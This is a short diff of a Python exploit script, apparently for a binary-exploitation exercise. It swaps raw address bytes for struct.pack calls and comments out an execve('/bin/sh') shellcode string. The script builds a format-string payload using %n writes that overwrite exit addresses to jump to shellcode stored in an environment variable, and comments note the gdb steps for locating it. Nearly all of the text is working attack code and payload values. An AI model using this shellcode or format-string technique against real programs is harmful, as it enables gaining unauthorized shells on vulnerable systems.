@@ -1,7 +1,6 @@
-shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+import struct
 
-exit_addrs  = "\xe0\x97\x04\x08" # 0x80497e0
-exit_addrs += "\xe2\x97\x04\x08" # 0x80497e0
+# shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 
 # SHELLCODE environment variable contain the shellcode to be executed.
 # The reason behine this is because the main function in the executable,
@@ -13,6 +12,9 @@ exit_addrs += "\xe2\x97\x04\x08" # 0x80497e0
 #   p (char *) getenv("SHELLCODE")
 
 # SHELLCODE addre: 0xffffd88f
+
+exit_addrs  = struct.pack('I', 0x80497e0)
+exit_addrs += struct.pack('I', 0x80497e2)
 
 exit_format = "%55431x%10$n%10096x%11$n"
 
